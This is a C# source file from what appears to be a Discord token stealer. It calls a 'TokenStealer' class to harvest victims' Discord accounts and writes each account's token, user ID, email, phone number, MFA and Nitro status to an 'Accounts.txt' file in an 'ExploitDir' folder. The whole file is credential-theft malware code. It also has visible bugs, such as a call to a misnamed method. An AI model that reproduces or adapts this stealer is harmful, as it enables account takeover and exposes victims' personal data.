﻿using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using SHARP;

public class Program
{
	public static async Task Main(string[] args)
	{
		await ProcessDiscordToken();
	}

	internal static async Task ProcessDiscordTokens()
	{
		try
		{
			DiscordAccountFormat[] result = await TokenStealer.GetAccounts().Result;
			StringBuilder stringBuilder = new StringBuilder();
			foreach (DiscordAccountFormat discordAccountFormat in result)
			{
				Counting.ds++;
				stringBuilder.AppendLine(string.Format("====================DISCORD=====================\n\n\nUsername: {0}\nToken: {1}\nUser ID: {2}\nMFA(Multi-Factor Authentication): {3}\nEmail: {4}\nPhone: {5}\nNitro: {6}\nVerifed: {7} \r\n", new object[]
				{
					discordAccountFormat.Username,
					discordAccountFormat.Token,
					discordAccountFormat.UserId,
					discordAccountFormat.Mfa,
					discordAccountFormat.Email,
					discordAccountFormat.PhoneNumber,
					discordAccountFormat.Nitro,
					discordAccountFormat.Verified
				}));
			}
			File.WriteAllText(Path.Combine(Help.ExploitDir, "Discord", "Accounts.txt"), stringBuilder.ToString());
			Console.WriteLine("Accounts and tokens have been written to file.");
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error getting Discord tokens: " + ex.Message);
		}
	}
}